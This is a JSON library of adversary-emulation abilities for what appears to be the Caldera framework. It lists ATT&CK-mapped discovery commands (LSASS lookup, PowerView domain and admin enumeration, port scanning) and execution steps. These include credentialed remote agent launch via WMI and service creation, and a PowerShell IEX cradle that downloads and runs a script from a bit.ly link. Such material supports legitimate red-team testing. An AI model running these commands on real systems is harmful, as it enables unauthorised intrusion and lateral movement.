    "05cda6f6-2b1b-462e-bff1-845af94343f7": {
        "description": "Discovers processes that the current user has the ability to access and selects an injectable one",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1057",
            "name": "Process Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\n$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq \"svchost\") {$p} };\n$valid | ConvertTo-Json\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.json": [
                            {
                                "source": "host.process.id",
                                "custom_parser_vals": {
                                    "json_key": "Id",
                                    "json_type": "int"
                                }
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "05cda6f6-2b1b-462e-bff1-845af94343f7",
            "None",
            "host.process.id"
        ],
        "plugin": "stockpile"
    },
    "5c65eec8-4839-4713-a4e1-86b2e75d1927": {
        "description": "Extracts the names of all open non-explorer windows, and the locations of all explorer windows.",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1010",
            "name": "Application Window Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$x = Get-Process | Where-Object {$_.MainWindowTitle -ne \"\"} | Select-Object MainWindowTitle;\n$a = New-Object -com \"Shell.Application\"; $b = $a.windows() | select-object LocationName;\nwrite-host ($x | Format-List | Out-String) ($b | Format-List | Out-String)"
                }
            }
        },
        "id__dependence__fact": [
            "5c65eec8-4839-4713-a4e1-86b2e75d1927",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "29451844-9b76-4e16-a9ee-d6feab4b24db": {
        "description": "Discover the PowerShell version",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1082",
            "name": "System Information Discovery"
        },
        "platforms": {
            "windows": {
                "psh,pwsh": {
                    "command": "$PSVersionTable\n"
                }
            }
        },
        "id__dependence__fact": [
            "29451844-9b76-4e16-a9ee-d6feab4b24db",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "8c06ebf8-bacf-486b-bd77-21ba8c5a5777": {
        "description": "Identify Firewalls",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1518.001",
            "name": "Software Discovery: Security Software Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$NameSpace = Get-WmiObject -Namespace \"root\" -Class \"__Namespace\" | Select Name | Out-String -Stream | Select-String \"SecurityCenter\";\n$SecurityCenter = $NameSpace | Select-Object -First 1;\nGet-WmiObject -Namespace \"root\\$SecurityCenter\" -Class AntiVirusProduct | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List;\n"
                }
            }
        },
        "id__dependence__fact": [
            "8c06ebf8-bacf-486b-bd77-21ba8c5a5777",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "8adf02e8-6e71-4244-886c-98c402857404": {
        "description": "Capture running processes and their loaded DLLs",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1057",
            "name": "Process Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "tasklist /m  >> $env:APPDATA\\vmtool.log;\ncat $env:APPDATA\\vmtool.log\n"
                }
            }
        },
        "id__dependence__fact": [
            "8adf02e8-6e71-4244-886c-98c402857404",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "6131397e-7765-424e-a594-3d7fb2d93a6a": {
        "description": "Determine the Windows Domain of a computer",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1482",
            "name": "Domain Trust Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetDomain | ConvertTo-Json -Depth 1\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.json": [
                            {
                                "source": "domain.ad.forest",
                                "custom_parser_vals": {
                                    "json_key": "Forest",
                                    "json_type": "str"
                                }
                            },
                            {
                                "source": "domain.ad.name",
                                "custom_parser_vals": {
                                    "json_key": "Name",
                                    "json_type": "str"
                                }
                            }
                        ]
                    },
                    "payloads": [
                        "powerview.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "6131397e-7765-424e-a594-3d7fb2d93a6a",
            "None",
            "domain.ad.forest"
        ],
        "plugin": "stockpile"
    },
    "14a21534-350f-4d83-9dd7-3c56b93a0c17": {
        "description": "Find Domain information",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1016",
            "name": "System Network Configuration Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "nbtstat -n\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.nbtstat": [
                            {
                                "source": "network.domain.name"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "14a21534-350f-4d83-9dd7-3c56b93a0c17",
            "None",
            "network.domain.name"
        ],
        "plugin": "stockpile"
    },
    "4d9b079c-9ede-4116-8b14-72ad3a5533af": {
        "description": "Capture running processes via PowerShell",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1057",
            "name": "Process Discovery"
        },
        "platforms": {
            "windows": {
                "psh,pwsh": {
                    "command": "get-process >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log\n"
                }
            }
        },
        "id__dependence__fact": [
            "4d9b079c-9ede-4116-8b14-72ad3a5533af",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "1c353eb4-29ab-4dfe-88ed-f34f5a60848e": {
        "description": "Find or discover files on the file system",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1083",
            "name": "File and Directory Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "Get-ChildItem -Path #{host.system.path}\n"
                }
            }
        },
        "id__dependence__fact": [
            "1c353eb4-29ab-4dfe-88ed-f34f5a60848e",
            "host.system.path",
            "None"
        ],
        "plugin": "stockpile"
    },
    "5dc841fd-28ad-40e2-b10e-fb007fe09e81": {
        "description": "Determine if the system is virtualized or physical",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1497.001",
            "name": "Virtualization/Sandbox Evasion: System Checks"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "get-wmiobject win32_computersystem | fl model\n"
                }
            }
        },
        "id__dependence__fact": [
            "5dc841fd-28ad-40e2-b10e-fb007fe09e81",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "5c4dd985-89e3-4590-9b57-71fed66ff4e2": {
        "description": "Summary of permission and security groups",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.001",
            "name": "Permission Groups Discovery: Local Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "gpresult /R\n"
                }
            },
            "darwin": {
                "sh": {
                    "command": "groups"
                }
            },
            "linux": {
                "sh": {
                    "command": "groups"
                }
            }
        },
        "id__dependence__fact": [
            "5c4dd985-89e3-4590-9b57-71fed66ff4e2",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "bd527b63-9f9e-46e0-9816-b8434d2b8989": {
        "description": "Obtain user from current session",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1033",
            "name": "System Owner/User Discovery"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "whoami\n"
                }
            },
            "linux": {
                "sh": {
                    "command": "whoami\n"
                }
            },
            "windows": {
                "psh": {
                    "command": "whoami\n"
                }
            }
        },
        "id__dependence__fact": [
            "bd527b63-9f9e-46e0-9816-b8434d2b8989",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "c9be8043-a445-4cbf-b77b-ed7bb007fc7c": {
        "description": "Determine the version of Internet Explorer running",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1518",
            "name": "Software Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Internet Explorer').Version\n"
                }
            }
        },
        "id__dependence__fact": [
            "c9be8043-a445-4cbf-b77b-ed7bb007fc7c",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "ce485320-41a4-42e8-a510-f5a8fe96a644": {
        "description": "Identify the organizations mail server",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "linux": {
                "sh": {
                    "command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "target.org.emailhost"
                            }
                        ]
                    }
                }
            },
            "darwin": {
                "sh": {
                    "command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "target.org.emailhost"
                            }
                        ]
                    }
                }
            },
            "windows": {
                "psh": {
                    "command": "(nslookup -querytype=mx #{target.org.domain}. | Select-String -pattern 'mail' | Out-String).Trim()\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "target.org.emailhost"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "ce485320-41a4-42e8-a510-f5a8fe96a644",
            "None",
            "target.org.emailhost"
        ],
        "plugin": "stockpile"
    },
    "921055f4-5970-4707-909e-62f594234d91": {
        "description": "Ping a remote host to see if it is accessible",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1016",
            "name": "System Network Configuration Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "ping #{remote.host.fqdn}\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.firewallping": [
                            {
                                "source": "remote.host.fqdn",
                                "edge": "isAccessibleFrom"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "921055f4-5970-4707-909e-62f594234d91",
            "remote.host.fqdn",
            "remote.host.fqdn"
        ],
        "plugin": "stockpile"
    },
    "c6607391-d02c-44b5-9b13-d3492ca58599": {
        "description": "Identify system services",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1007",
            "name": "System Service Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "Get-Service"
                }
            }
        },
        "id__dependence__fact": [
            "c6607391-d02c-44b5-9b13-d3492ca58599",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "b18e8767-b7ea-41a3-8e80-baf65a5ddef5": {
        "description": "Check to see what version of python is installed",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1518",
            "name": "Software Discovery"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "python3 --version;python2 --version;python --version\n"
                }
            },
            "linux": {
                "sh": {
                    "command": "python3 --version;python2 --version;python --version\n"
                }
            },
            "windows": {
                "cmd": {
                    "command": "python3 --version&python2 --version&python --version\n"
                }
            }
        },
        "id__dependence__fact": [
            "b18e8767-b7ea-41a3-8e80-baf65a5ddef5",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "3b5db901-2cb8-4df7-8043-c4628a6a5d5a": {
        "description": "Get process info for processes running as a user",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1057",
            "name": "Process Discovery"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "ps aux | grep #{host.user.name}\n"
                }
            },
            "linux": {
                "sh": {
                    "command": "ps aux | grep #{host.user.name}\n"
                }
            },
            "windows": {
                "psh": {
                    "command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\nforeach($p in $ps) {\n    if($p.Owner -eq \"#{host.user.name}\") {\n        $p;\n    }\n}\n"
                }
            }
        },
        "id__dependence__fact": [
            "3b5db901-2cb8-4df7-8043-c4628a6a5d5a",
            "host.user.name",
            "None"
        ],
        "plugin": "stockpile"
    },
    "a0676fe1-cd52-482e-8dde-349b73f9aa69": {
        "description": "See the most used WIFI networks of a machine",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1016",
            "name": "System Network Configuration Discovery"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "./wifi.sh pref\n",
                    "payloads": [
                        "wifi.sh"
                    ],
                    "parsers": {
                        "plugins.stockpile.app.parsers.wifipref": [
                            {
                                "source": "wifi.network.ssid"
                            }
                        ]
                    }
                }
            },
            "linux": {
                "sh": {
                    "command": "./wifi.sh pref\n",
                    "payloads": [
                        "wifi.sh"
                    ],
                    "parsers": {
                        "plugins.stockpile.app.parsers.wifipref": [
                            {
                                "source": "wifi.network.ssid"
                            }
                        ]
                    }
                }
            },
            "windows": {
                "psh": {
                    "command": ".\\wifi.ps1 -Pref\n",
                    "payloads": [
                        "wifi.ps1"
                    ],
                    "parsers": {
                        "plugins.stockpile.app.parsers.wifipref": [
                            {
                                "source": "wifi.network.ssid"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "a0676fe1-cd52-482e-8dde-349b73f9aa69",
            "None",
            "wifi.network.ssid"
        ],
        "plugin": "stockpile"
    },
    "0bff4ee7-42a4-4bde-b09a-9d79d8b9edd7": {
        "description": "Get process info for LSASS",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1057",
            "name": "Process Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$ps = get-process | select processname,Id;\n$valid = foreach($p in $ps) { if($p.ProcessName -eq \"lsass\") {$p} };\n$valid | ConvertTo-Json\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.json": [
                            {
                                "source": "host.process.id",
                                "custom_parser_vals": {
                                    "json_key": "Id",
                                    "json_type": "int"
                                }
                            }
                        ]
                    }
                },
                "cmd": {
                    "build_target": "GetLsass.exe",
                    "language": "csharp",
                    "code": "using System;\nusing System.Diagnostics;\nusing System.ComponentModel;\n\nnamespace ProcessDump\n{\n    class MyProcess\n    {\n        void GrabLsassProcess()\n        {\n            Process[] allProc = Process.GetProcessesByName(\"lsass\");\n            foreach(Process proc in allProc){\n                Console.WriteLine(\"Process: {0} -> PID: {1}\", proc.ProcessName, proc.Id);\n            }\n        }\n        static void Main(string[] args)\n        {\n            MyProcess myProc = new MyProcess();\n            myProc.GrabLsassProcess();\n        }\n    }\n}\n"
                }
            }
        },
        "id__dependence__fact": [
            "0bff4ee7-42a4-4bde-b09a-9d79d8b9edd7",
            "None",
            "host.process.id"
        ],
        "plugin": "stockpile"
    },
    "6e1a53c0-7352-4899-be35-fa7f364d5722": {
        "description": "Print the current working directory on the system",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1083",
            "name": "File and Directory Discovery"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "pwd\n"
                }
            },
            "linux": {
                "sh": {
                    "command": "pwd\n"
                }
            },
            "windows": {
                "psh": {
                    "command": "pwd\n"
                }
            }
        },
        "id__dependence__fact": [
            "6e1a53c0-7352-4899-be35-fa7f364d5722",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "fdf8bf36-797f-4157-805b-fe7c1c6fc903": {
        "description": "Find hostname of remote host",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "nbtstat -A #{remote.host.ip}"
                }
            }
        },
        "id__dependence__fact": [
            "fdf8bf36-797f-4157-805b-fe7c1c6fc903",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "fa6e8607-e0b1-425d-8924-9b894da5a002": {
        "description": "get current system time (ISO 8601)",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1124",
            "name": "System Time Discovery"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.current.time"
                            }
                        ]
                    }
                }
            },
            "linux": {
                "sh": {
                    "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.current.time"
                            }
                        ]
                    }
                }
            },
            "windows": {
                "psh": {
                    "command": "Get-Date -UFormat '+%Y-%m-%dT%H:%M:%SZ'\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.current.time"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "fa6e8607-e0b1-425d-8924-9b894da5a002",
            "None",
            "host.current.time"
        ],
        "plugin": "stockpile"
    },
    "5a4cb2be-2684-4801-9355-3a90c91e0004": {
        "description": "Scans the local network for common open ports",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1046",
            "name": "Network Service Scanning"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "Import-Module ./basic_scanner.ps1;\n$ports = @(22, 53, 80, 445);\nGet-NetIPConfiguration | ?{$_.NetAdapter.Status -ne \"Disconnected\"} | Get-NetIPaddress -AddressFamily IPv4 | %{\n    $ipv4 = $_.IPAddress;\n    $prefixLength = $_.PrefixLength;\n    Scan-Netrange -ipv4 $ipv4 -prefixLength $prefixLength -ports $ports;\n};\n",
                    "payloads": [
                        "basic_scanner.ps1"
                    ],
                    "timeout": 180
                }
            }
        },
        "id__dependence__fact": [
            "5a4cb2be-2684-4801-9355-3a90c91e0004",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "c7ec57cd-933e-42b6-99a4-e852a9e57a33": {
        "description": "The net utility is executed via cmd to enumerate domain user accounts.",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.002",
            "name": "Account Discovery: Domain Account"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "command": "net user /domain"
                }
            }
        },
        "id__dependence__fact": [
            "c7ec57cd-933e-42b6-99a4-e852a9e57a33",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "7c42a30c-c8c7-44c5-80a8-862d364ac1e4": {
        "description": "Determine whether or not UAC is enabled",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1518.001",
            "name": "Software Discovery: Security Software Discovery"
        },
        "platforms": {
            "windows": {
                "psh,pwsh": {
                    "command": "echo $(get-uac)\n"
                }
            }
        },
        "id__dependence__fact": [
            "7c42a30c-c8c7-44c5-80a8-862d364ac1e4",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "530e47c6-8592-42bf-91df-c59ffbd8541b": {
        "description": "Network Share Discovery",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1135",
            "name": "Network Share Discovery"
        },
        "platforms": {
            "windows": {
                "pwsh,psh": {
                    "command": "Get-SmbShare | ConvertTo-Json",
                    "parsers": {
                        "plugins.stockpile.app.parsers.json": [
                            {
                                "source": "domain.smb.share",
                                "custom_parser_vals": {
                                    "json_key": "Path",
                                    "json_type": "str"
                                }
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "530e47c6-8592-42bf-91df-c59ffbd8541b",
            "None",
            "domain.smb.share"
        ],
        "plugin": "stockpile"
    },
    "2946edba-54d8-11eb-ae93-0242ac130002": {
        "description": "Password Policy Discovery for a domain",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1201",
            "name": "Password Policy Discovery for a domain"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "net accounts /domain\n"
                }
            }
        },
        "id__dependence__fact": [
            "2946edba-54d8-11eb-ae93-0242ac130002",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "13379ae1-d20e-4162-91f8-320d78a35e7f": {
        "description": "Use PowerView to query the Active Directory server for a list of computers in the Domain",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "Import-Module .\\powerview.ps1;\nGet-DomainComputer\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.gdomain": [
                            {
                                "source": "remote.host.fqdn"
                            }
                        ]
                    },
                    "payloads": [
                        "powerview.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "13379ae1-d20e-4162-91f8-320d78a35e7f",
            "None",
            "remote.host.fqdn"
        ],
        "plugin": "stockpile"
    },
    "0360ede1-3c28-48d3-a6ef-6e98f562c5af": {
        "description": "Get a list of all computers in a domain",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "Import-Module .\\PowerView.ps1 -Force;\nGet-NetComputer\n",
                    "payloads": [
                        "powerview.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "0360ede1-3c28-48d3-a6ef-6e98f562c5af",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "2afae782-6d0a-4fbd-a6b6-d1ce90090eac": {
        "description": "Use PowerView to query the Active Directory server to determine remote admins",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.002",
            "name": "Permission Groups Discovery: Domain Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "Import-Module .\\powerview.ps1;\n$backup = \"#{backup.admin.ability}\";\n$userName = \"#{domain.user.name}\";\n$userPassword = \"#{domain.user.password}\";\n$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force;\n$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword);\nGet-NetLocalGroupMember -ComputerName #{remote.host.fqdn} -Credential $credObject\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.netlocalgroup": [
                            {
                                "source": "remote.host.fqdn",
                                "edge": "has_admin",
                                "target": "domain.user.name"
                            }
                        ]
                    },
                    "payloads": [
                        "powerview.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "2afae782-6d0a-4fbd-a6b6-d1ce90090eac",
            "remote.host.fqdn",
            "remote.host.fqdn"
        ],
        "plugin": "stockpile"
    },
    "2488245e-bcbd-405d-920e-2de27db882b3": {
        "description": "Query Registry using PowerShell Get-ItemProperty",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1012",
            "name": "Query Registry"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "Get-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\n"
                }
            }
        },
        "id__dependence__fact": [
            "2488245e-bcbd-405d-920e-2de27db882b3",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "638fb6bb-ba39-4285-93d1-7e4775b033a8": {
        "description": "Find System Network Connections",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1049",
            "name": "System Network Connections Discovery"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "netstat -anto\n"
                }
            },
            "linux": {
                "sh": {
                    "command": "netstat -anto\n"
                }
            },
            "windows": {
                "psh": {
                    "command": "netstat -anto;\nGet-NetTCPConnection\n"
                }
            }
        },
        "id__dependence__fact": [
            "638fb6bb-ba39-4285-93d1-7e4775b033a8",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "e8017c46-acb8-400c-a4b5-b3362b5b5baa": {
        "description": "View network configuration info for host",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1016",
            "name": "System Network Configuration Discovery"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "sudo ifconfig\n"
                }
            },
            "linux": {
                "sh": {
                    "command": "sudo ifconfig\n"
                }
            },
            "windows": {
                "psh": {
                    "command": "ipconfig\n"
                }
            }
        },
        "id__dependence__fact": [
            "e8017c46-acb8-400c-a4b5-b3362b5b5baa",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "f1cf4ea1-43f0-4604-9537-3d1b1b2d5b1c": {
        "description": "Get Service Accounts for a domain",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1033",
            "name": "System Owner/User Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -SPN | ConvertTo-Json -Depth 1\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.json": [
                            {
                                "source": "domain.user.name",
                                "custom_parser_vals": {
                                    "json_key": "samaccountname",
                                    "json_type": "str"
                                }
                            }
                        ]
                    },
                    "payloads": [
                        "powerview.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "f1cf4ea1-43f0-4604-9537-3d1b1b2d5b1c",
            "None",
            "domain.user.name"
        ],
        "plugin": "stockpile"
    },
    "aaf34d82-aea9-4278-8ec4-789653e4f5d9": {
        "description": "Get Administrator users for a computer",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1033",
            "name": "System Owner/User Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -AdminCount | ConvertTo-Json -Depth 1\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.json": [
                            {
                                "source": "domain.user.name",
                                "custom_parser_vals": {
                                    "json_key": "samaccountname",
                                    "json_type": "str"
                                }
                            }
                        ]
                    },
                    "payloads": [
                        "powerview.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "aaf34d82-aea9-4278-8ec4-789653e4f5d9",
            "None",
            "domain.user.name"
        ],
        "plugin": "stockpile"
    },
    "ece5dde3-d370-4c20-b213-a1f424aa8d03": {
        "description": "Remotely executes 54ndc47 over WMI",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1047",
            "name": "Windows Management Instrumentation"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "wmic /node:`\"#{remote.host.fqdn}`\" /user:`\"#{domain.user.name}`\" /password:`\"#{domain.user.password}`\" process call create \"powershell.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group}\";\n",
                    "cleanup": "wmic /node:`\"#{remote.host.fqdn}`\" /user:`\"#{domain.user.name}`\" /password:`\"#{domain.user.password}`\" process call create \"taskkill /f /im s4ndc4t.exe\"\n"
                },
                "cmd": {
                    "command": "wmic /node:`\"#{remote.host.fqdn}`\" /user:`\"#{domain.user.name}`\" /password:`\"#{domain.user.password}`\" process call create \"cmd.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group}\";\n",
                    "cleanup": "wmic /node:`\"#{remote.host.fqdn}`\" /user:`\"#{domain.user.name}`\" /password:`\"#{domain.user.password}`\" process call create \"taskkill /f /im s4ndc4t.exe\"\n"
                }
            }
        },
        "id__dependence__fact": [
            "ece5dde3-d370-4c20-b213-a1f424aa8d03",
            "domain.user.name",
            "None"
        ],
        "plugin": "stockpile"
    },
    "95727b87-175c-4a69-8c7a-a5d82746a753": {
        "description": "Create a service named \"sandsvc\" to execute remote 54ndc57 binary named \"s4ndc4t.exe\"",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1569.002",
            "name": "System Services: Service Execution"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "timeout": 300,
                    "cleanup": "sc.exe \\\\#{remote.host.fqdn} stop sandsvc;\nsc.exe \\\\#{remote.host.fqdn} delete sandsvc /f;\ntaskkill /s \\\\#{remote.host.fqdn} /FI \"Imagename eq s4ndc4t.exe\"\n",
                    "command": "sc.exe \\\\#{remote.host.fqdn} create sandsvc start= demand error= ignore binpath= \"cmd /c start C:\\Users\\Public\\s4ndc4t.exe -server #{server} -v -originLinkID #{origin_link_id}\" displayname= \"Sandcat Execution\";\nsc.exe \\\\#{remote.host.fqdn} start sandsvc;\nStart-Sleep -s 15;\nGet-Process -ComputerName #{remote.host.fqdn} s4ndc4t;\n"
                }
            }
        },
        "id__dependence__fact": [
            "95727b87-175c-4a69-8c7a-a5d82746a753",
            "remote.host.fqdn",
            "None"
        ],
        "plugin": "stockpile"
    },
    "315cedf1-4a3a-4015-b63f-149d64bacbbc": {
        "description": "Emulate administrator tasks on a system in a separate process",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh,pwsh": {
                    "command": "start powershell.exe -ArgumentList \"-NoP\",\"-StA\",\"-ExecutionPolicy\",\"bypass\",\".\\Emulate-Administrator-Tasks.ps1\"\n",
                    "cleanup": "Remove-Item -Force -Path \".\\Emulate-Administrator-Tasks.ps1\"\n",
                    "payloads": [
                        "Emulate-Administrator-Tasks.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "315cedf1-4a3a-4015-b63f-149d64bacbbc",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "3796a00b-b11d-4731-b4ca-275a07d83299": {
        "description": "Run an application as a different user",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$job = Start-Job -ScriptBlock {\n  $username = '#{host.user.name}';\n  $password = '#{host.user.password}';\n  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;\n  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;\n  Start-Process Notepad.exe -NoNewWindow -PassThru -Credential $credential;\n};\nReceive-Job -Job $job -Wait;\n"
                }
            }
        },
        "id__dependence__fact": [
            "3796a00b-b11d-4731-b4ca-275a07d83299",
            "host.user.name",
            "None"
        ],
        "plugin": "stockpile"
    },
    "bfff9006-d1fb-46ce-b173-92cb04e9a031": {
        "description": "Download",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "powershell.exe -c IEX (New-Object Net.Webclient).downloadstring(\"https://bit.ly/33H0QXi\") \n"
                }
            }
        },
        "id__dependence__fact": [
            "bfff9006-d1fb-46ce-b173-92cb04e9a031",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
